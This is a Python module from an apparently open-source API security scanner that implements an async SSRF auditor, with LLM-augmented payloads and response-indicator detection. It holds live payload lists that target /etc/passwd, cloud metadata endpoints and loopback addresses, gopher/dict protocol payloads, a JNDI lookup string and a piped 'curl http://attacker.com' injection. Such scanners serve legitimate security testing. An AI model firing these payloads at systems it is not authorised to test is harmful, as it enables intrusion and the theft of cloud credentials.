########################################################
# APISCAN - API Security Scanner                       #
# Licensed under the AGPL-v3.0                          #
#                                                       #
# improved_ssrf_audit.py                                #
# Modernized SSRF (OWASP API7) auditor.                 #
#                                                       #
# Async rewrite of ssrf_audit.py:                       #
#   httpx.AsyncClient + asyncio  (was requests+threads) #
#   LLM-generated payloads       (Claude fuzzing)       #
#   Passive fingerprint -> active scan balance          #
#   Playwright fallback for JS/WAF endpoints            #
#   networkx finding correlation                        #
#   structlog logging + JSONL streaming                 #
#                                                       #
# Backward compatible: exposes generate_report/         #
# save_report and a sync test_endpoints() so apiscan.py #
# can keep calling it like the legacy auditor.          #
########################################################
from __future__ import annotations

import asyncio
import base64
import html
import json
import random
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Dict, List, Optional
from urllib.parse import quote_plus, urljoin, urlparse

from report_utils import ReportGenerator

from improved_common import (
    AsyncHTTPClient,
    LLMPayloadGenerator,
    PassiveFingerprinter,
    PlaywrightProbe,
    ProbeResponse,
    ResultStreamer,
    ScanConfig,
    VulnerabilityGraph,
    get_logger,
    run_async,
)

Endpoint = Dict[str, Any]
Issue = Dict[str, Any]


def _abs_url(base_url: str, rel: str) -> str:
    if rel.startswith(("http://", "https://")):
        return rel
    return urljoin(base_url.rstrip("/") + "/", rel.lstrip("/"))


class AsyncSSRFAuditor:
    """Async, LLM-assisted SSRF auditor (drop-in for ``SSRFAuditor``)."""

    SAFE_FILE_PAYLOADS = [
        "file:///etc/passwd",
        "file:///etc/hosts",
        "file:///c:/windows/system32/drivers/etc/hosts",
        "file:///c:/windows/win.ini",
    ]
    CLOUD_METADATA_PAYLOADS = [
        "http://169.254.169.254/",
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/user-data/",
        "http://metadata.google.internal/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://100.100.100.200/latest/meta-data/",
        "http://metadata.tencentyun.com/latest/meta-data/",
    ]
    LOOPBACK_PAYLOADS = [
        "http://localhost/",
        "http://127.0.0.1/",
        "http://[::1]/",
        "http://0.0.0.0/",
        "http://2130706433/",
        "http://127.0.0.1.nip.io/",
    ]
    DNS_REBINDING_PAYLOADS = [
        "http://example.com#@evil.com/",
        "http://example.com@evil.com/",
        "http://127.0.0.1:80@evil.com/",
    ]
    OAST_PAYLOADS = [
        "http://burpcollaborator.net/",
        "http://localtest.me/",
        "http://customer.app.localhost.127.0.0.1.nip.io/",
    ]
    PROTOCOL_PAYLOADS = [
        "gopher://127.0.0.1:11211/_stats\\r\\nquit\\r\\n",
        "dict://127.0.0.1:11211/stats",
        "ldap://127.0.0.1:389/",
    ]
    LANG_PAYLOADS = [
        "http://127.0.0.1/%0D%0AConnection:%20keep-alive",
        "en;http://169.254.169.254",
        "../../../../etc/passwd",
        "${jndi:ldap://attacker.com}",
        "en|curl http://attacker.com",
    ]

    PAYLOADS = (
        SAFE_FILE_PAYLOADS
        + CLOUD_METADATA_PAYLOADS
        + LOOPBACK_PAYLOADS
        + DNS_REBINDING_PAYLOADS
        + OAST_PAYLOADS
        + PROTOCOL_PAYLOADS
    )

    ENCODINGS = ["default", "double_url", "utf8", "base64", "html"]
    EXCLUDED_PARAMS = ["token", "auth", "password", "secret", "key"]
    COMMON_PARAMS = {
        "url", "endpoint", "host", "server", "target", "lang", "language",
        "locale", "v", "version", "api",
    }

    RESPONSE_INDICATORS = (
        "169.254.169.254", "metadata.google.internal", "computemetadata",
        "service-accounts", "instance-id", "ami-id", "root:x:", "/etc/passwd",
        "localhost", "127.0.0.1", "[::1]",
    )
    HEADER_INDICATORS = ("metadata-flavor", "x-aws-ec2-metadata", "x-envoy", "server: envoy")

    def __init__(
        self,
        *args: Any,
        session: Any = None,
        base_url: Optional[str] = None,
        swagger_spec: Optional[Dict[str, Any]] = None,
        config: Optional[ScanConfig] = None,
        show_progress: bool = True,
        **kwargs: Any,
    ) -> None:
        # Accept legacy positional (base_url, session) / (session, base_url).
        if base_url is None and args:
            for a in args:
                if isinstance(a, str) and base_url is None:
                    base_url = a
                elif session is None and not isinstance(a, str):
                    session = a
        if not base_url:
            raise ValueError("base_url is required")

        self.base_url = base_url.rstrip("/") if "://" in base_url else f"http://{base_url}"
        self._session = session
        self.spec = swagger_spec or {}
        self.show_progress = show_progress
        self.config = config or ScanConfig(
            concurrency=int(kwargs.get("concurrency", 20)),
            rps=float(kwargs.get("rps", 15.0)),
            timeout=float(kwargs.get("timeout", 15.0)),
            use_llm=bool(kwargs.get("use_llm", False)),
            use_browser=bool(kwargs.get("use_browser", False)),
        )
        self.log = get_logger("apiscan.ssrf")
        self.graph = VulnerabilityGraph()
        self._issues: List[Issue] = []
        stream_path = kwargs.get("stream_path") or (
            Path(self.config.output_dir) / "ssrf_findings.jsonl" if self.config.stream_results else None
        )
        self._streamer = ResultStreamer(stream_path, key_fields=("endpoint", "parameter", "payload", "description"))
        self._fp = PassiveFingerprinter()
        self._recommend: Dict[str, Any] = {}

    # ---- swagger parsing (kept identical to legacy API) -------------------- #
    @staticmethod
    def endpoints_from_swagger(swagger_path: str | Path, *, default_base: str = "") -> List[Endpoint]:
        try:
            p = Path(swagger_path)
            raw = p.read_text(encoding="utf-8")
            if str(swagger_path).lower().endswith((".yml", ".yaml")):
                import yaml as _yaml
                spec = _yaml.safe_load(raw) or {}
            else:
                try:
                    spec = json.loads(raw)
                except json.JSONDecodeError:
                    import yaml as _yaml
                    spec = _yaml.safe_load(raw) or {}
        except Exception:
            return []

        servers = spec.get("servers") or []
        base = (servers[0].get("url") if servers and isinstance(servers[0], dict) else "") or default_base
        paths = spec.get("paths") or {}
        out: List[Endpoint] = []
        for path, item in paths.items():
            if not isinstance(item, dict):
                continue
            for method, meta in item.items():
                if method.upper() not in {"GET", "POST", "PUT", "PATCH", "DELETE", "HEAD", "OPTIONS"}:
                    continue
                params: List[Any] = []
                if isinstance(item.get("parameters"), list):
                    params.extend(item["parameters"])
                if isinstance(meta, dict) and isinstance(meta.get("parameters"), list):
                    params.extend(meta["parameters"])
                out.append({
                    "method": method.upper(),
                    "path": path,
                    "url": _abs_url(base or default_base, path),
                    "parameters": params,
                })
        return out

    # ---- encoding --------------------------------------------------------- #
    @staticmethod
    def _encode(payload: str, encoding: str) -> str:
        if encoding == "double_url":
            return quote_plus(quote_plus(payload))
        if encoding == "utf8":
            return quote_plus(payload.encode("utf-8"))
        if encoding == "base64":
            return base64.b64encode(payload.encode()).decode()
        if encoding == "html":
            return html.escape(payload)
        return quote_plus(payload)

    def _should_exclude(self, name: str) -> bool:
        n = (name or "").lower()
        return any(kw in n for kw in self.EXCLUDED_PARAMS)

    # ---- async scan orchestration ---------------------------------------- #
    async def _run_async(self, endpoints: List[Endpoint]) -> List[Issue]:
        self._issues.clear()
        client = AsyncHTTPClient.from_requests_session(self._session, self.config, logger=self.log) \
            if self._session is not None else AsyncHTTPClient(self.config, logger=self.log)

        browser: Optional[PlaywrightProbe] = None
        try:
            # 1) Passive fingerprint of the base URL -> tune active intensity.
            await self._passive_fingerprint(client)
            if self._recommend.get("use_browser"):
                browser = PlaywrightProbe(self.config, logger=self.log)
                await browser.start()

            # 2) LLM-augment the payload set once, up front.
            llm = LLMPayloadGenerator(self.config, logger=self.log)
            payloads = await llm.generate(
                "SSRF (server-side request forgery)",
                f"base={self.base_url} server={self._recommend.get('reason', {}).get('server','')}",
                self.PAYLOADS,
            )
            self.log.info("payloads_ready", count=len(payloads), llm=llm.enabled)

            # 3) Concurrent per-endpoint scanning (semaphore lives in client).
            tasks = [self._scan_endpoint(client, browser, ep, payloads) for ep in endpoints]
            await asyncio.gather(*tasks, return_exceptions=True)
        finally:
            await client.aclose()
            if browser is not None:
                await browser.close()
            self._streamer.close()
        return self._issues

    async def _passive_fingerprint(self, client: AsyncHTTPClient) -> None:
        resp = await client.request("GET", self.base_url)
        fp = self._fp.fingerprint(resp.headers, resp.text)
        self._recommend = self._fp.recommend(fp, self.config)
        # Apply the throttling recommendation for the rest of the run.
        if self._recommend.get("rps") and self._recommend["rps"] < self.config.rps:
            client._limiter._min_gap = 1.0 / float(self._recommend["rps"])  # tighten pacing
        self.log.info("fingerprint", **fp)

    async def _baseline_latency(self, client: AsyncHTTPClient, url: str, method: str) -> float:
        vals: List[float] = []
        for _ in range(self.config.baseline_samples):
            r = await client.request(method, url)
            if r.ok:
                vals.append(r.elapsed)
        if not vals:
            return 0.0
        vals.sort()
        return vals[len(vals) // 2]

    async def _scan_endpoint(
        self,
        client: AsyncHTTPClient,
        browser: Optional[PlaywrightProbe],
        ep: Endpoint,
        payloads: List[str],
    ) -> None:
        method = (ep.get("method") or "GET").upper()
        path = ep.get("path") or ""
        url_base = _abs_url(self.base_url, path)
        host = (urlparse(url_base).hostname or "").lower()
        if host in {"127.0.0.1", "localhost", "::1"}:
            return

        baseline = await self._baseline_latency(client, url_base, method)

        swagger_params = {
            p.get("name") for p in ep.get("parameters") or []
            if p.get("in") in {"query", "header", "path"}
        }
        all_params = sorted(
            x for x in (swagger_params | self.COMMON_PARAMS)
            if x and not self._should_exclude(x)
        )

        # Smart limiting (mirrors legacy env knobs) to avoid combinatorial blowup.
        import os
        max_params = int(os.environ.get("APISCAN_SSRF_MAX_PARAMS", "3"))
        max_payloads = int(os.environ.get("APISCAN_SSRF_MAX_PAYLOADS", "4"))
        max_encodings = int(os.environ.get("APISCAN_SSRF_MAX_ENCODINGS", "2"))

        chosen_payloads = list(payloads)
        random.shuffle(chosen_payloads)
        chosen_payloads = chosen_payloads[:max_payloads]
        encodings = self.ENCODINGS[:max_encodings]

        probe_tasks = []
        for param in all_params[:max_params]:
            pset = list(chosen_payloads)
            if param in {"lang", "language", "locale", "v", "version"}:
                pset = pset + self.LANG_PAYLOADS[:max_payloads]
            for payload in pset:
                for enc in encodings:
                    encoded = self._encode(payload, enc)
                    probe_tasks.append(
                        self._probe_param(client, browser, ep, url_base, method, param, encoded, enc, baseline)
                    )
        await asyncio.gather(*probe_tasks, return_exceptions=True)

    async def _probe_param(
        self,
        client: AsyncHTTPClient,
        browser: Optional[PlaywrightProbe],
        ep: Endpoint,
        base_url: str,
        method: str,
        param: str,
        payload: str,
        encoding: str,
        baseline: float,
    ) -> None:
        # query string
        qs_url = f"{base_url}?{param}={payload}"
        await self._probe(client, browser, ep, qs_url, method, payload, param, encoding, baseline)

        # body variants
        if method in {"POST", "PUT", "PATCH"}:
            await self._probe(client, browser, ep, base_url, method, payload, param, encoding, baseline, json_body={param: payload})
            await self._probe(client, browser, ep, base_url, method, payload, param, encoding, baseline, data={param: payload})

        # header injection
        await self._probe(client, browser, ep, base_url, method, payload, param, encoding, baseline, headers={param: payload})

        # path templating
        if f"{{{param}}}" in base_url:
            await self._probe(client, browser, ep, base_url.replace(f"{{{param}}}", payload), method, payload, param, encoding, baseline)

    async def _probe(
        self,
        client: AsyncHTTPClient,
        browser: Optional[PlaywrightProbe],
        ep: Endpoint,
        url: str,
        method: str,
        payload: str,
        param: str,
        encoding: str,
        baseline: float,
        *,
        json_body: Optional[dict] = None,
        data: Optional[dict] = None,
        headers: Optional[dict] = None,
    ) -> None:
        cache_key = f"{method}|{url}|{json.dumps(json_body or data or {}, sort_keys=True)}|{json.dumps(headers or {}, sort_keys=True)}"
        resp = await client.request(method, url, json_body=json_body, data=data, headers=headers, cache_key=cache_key)
        if not resp.ok:
            return

        # If passive fingerprint flagged JS/WAF and this looks blocked, retry via browser.
        if browser is not None and browser.available and method == "GET" and (resp.status_code in (403, 429, 503) or self._looks_challenged(resp.text)):
            b = await browser.fetch(url)
            if b.ok:
                resp = b

        self._analyze(ep, resp, payload, param, encoding, baseline)

    @staticmethod
    def _looks_challenged(body: str) -> bool:
        low = (body or "")[:2048].lower()
        return any(s in low for s in ("just a moment", "checking your browser", "challenge-platform"))

    def _analyze(self, ep: Endpoint, resp: ProbeResponse, payload: str, param: str, encoding: str, baseline: float) -> None:
        body_low = (resp.text or "")[: self.config.response_body_limit].lower()
        hdr_low = " ".join(f"{k}:{v}" for k, v in resp.headers.items()).lower()

        is_blind = resp.elapsed >= self.config.blind_threshold
        if baseline > 0.0:
            is_blind = is_blind and resp.elapsed >= baseline * 2.0

        if is_blind:
            self._record(ep, payload, resp, f"Potential blind SSRF (latency {resp.elapsed:.2f}s)", param, encoding, "Medium")
            return

        if any(ind in body_low for ind in self.RESPONSE_INDICATORS) or any(h in hdr_low for h in self.HEADER_INDICATORS):
            self._record(ep, payload, resp, "Reflected SSRF indicators in response", param, encoding, "High")

    def _confidence(self, resp: ProbeResponse) -> str:
        body = (resp.text or "").lower()
        hdrs = " ".join(f"{k}:{v}" for k, v in resp.headers.items()).lower()
        if "root:x:" in body or "169.254.169.254" in body or "computemetadata" in body or "metadata-flavor" in hdrs:
            return "High"
        if resp.elapsed > self.config.blind_threshold:
            return "Medium"
        return "Low"

    def _record(self, ep: Endpoint, payload: str, resp: ProbeResponse, note: str, param: str, encoding: str, severity: str) -> None:
        issue = {
            "endpoint": f"{ep.get('method', 'GET')} {ep.get('path', '')}",
            "parameter": param or "N/A",
            "payload": payload,
            "encoding": encoding or "default",
            "status_code": resp.status_code,
            "latency": round(resp.elapsed, 2),
            "description": note,
            "severity": severity,
            "confidence": self._confidence(resp),
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "request_headers": list(resp.request_headers.items()),
            "response_headers": list(resp.headers.items()),
            "request_body": resp.request_body,
            "response_body": (resp.text or "")[: self.config.response_body_limit],
            "request_cookies": {},
            "response_cookies": resp.cookies,
            "evidence": (resp.text or "")[:500],
            "reproduction_steps": f"Send {ep.get('method', 'GET')} request to {ep.get('path', '')} with {param}={payload}",
            "detected_via": resp.source,
        }
        # Dedupe via streamer key; only append/emit new findings.
        if self._streamer.emit(issue):
            self._issues.append(issue)
            self.graph.add_finding(issue)
            if self.show_progress:
                self.log.info("ssrf_finding", endpoint=issue["endpoint"], param=param, confidence=issue["confidence"], via=resp.source)

    # ---- public API (compatible with legacy SSRFAuditor) ------------------ #
    async def test_endpoints_async(self, endpoints: List[Endpoint]) -> List[Issue]:
        return await self._run_async(endpoints)

    def test_endpoints(self, endpoints: List[Endpoint]) -> List[Issue]:
        """Synchronous wrapper so apiscan.py can call it like the legacy auditor."""
        return run_async(self._run_async(endpoints))

    def correlation(self) -> Dict[str, Any]:
        return self.graph.correlate()

    def _filtered_findings(self) -> List[dict]:
        return list(self._issues)

    def generate_report(self, fmt: str = "html") -> str:
        issues = self._filtered_findings()
        if not issues:
            issues = [{
                "endpoint": "-", "description": "No SSRF findings detected", "severity": "Info",
                "status_code": 200, "timestamp": datetime.now(timezone.utc).isoformat(),
                "request_headers": [], "response_headers": [], "response_body": "",
            }]
        gen = ReportGenerator(issues, scanner="SSRF (API7) [improved]", base_url=self.base_url)
        return gen.generate_html() if fmt == "html" else gen.generate_markdown()

    def save_report(self, path: str, fmt: str = "html") -> None:
        gen = ReportGenerator(self._filtered_findings(), scanner="SSRF (API7) [improved]", base_url=self.base_url)
        if fmt == "markdown":
            Path(path).write_text(gen.generate_markdown(), encoding="utf-8")
        else:
            gen.save(path)


# Legacy alias so existing imports keep working.
SSRFAuditor = AsyncSSRFAuditor


if __name__ == "__main__":
    import argparse

    ap = argparse.ArgumentParser(description="Modernized async SSRF auditor")
    ap.add_argument("--url", required=True)
    ap.add_argument("--swagger")
    ap.add_argument("--use-llm", action="store_true")
    ap.add_argument("--use-browser", action="store_true")
    ap.add_argument("--report", default="ssrf_report.html")
    args = ap.parse_args()

    cfg = ScanConfig(use_llm=args.use_llm, use_browser=args.use_browser)
    auditor = AsyncSSRFAuditor(base_url=args.url, config=cfg)
    eps = AsyncSSRFAuditor.endpoints_from_swagger(args.swagger, default_base=args.url) if args.swagger else [
        {"method": "GET", "path": "/", "url": args.url, "parameters": []}
    ]
    findings = auditor.test_endpoints(eps)
    auditor.save_report(args.report, fmt="html")
    print(json.dumps({"findings": len(findings), "correlation": auditor.correlation()}, indent=2))
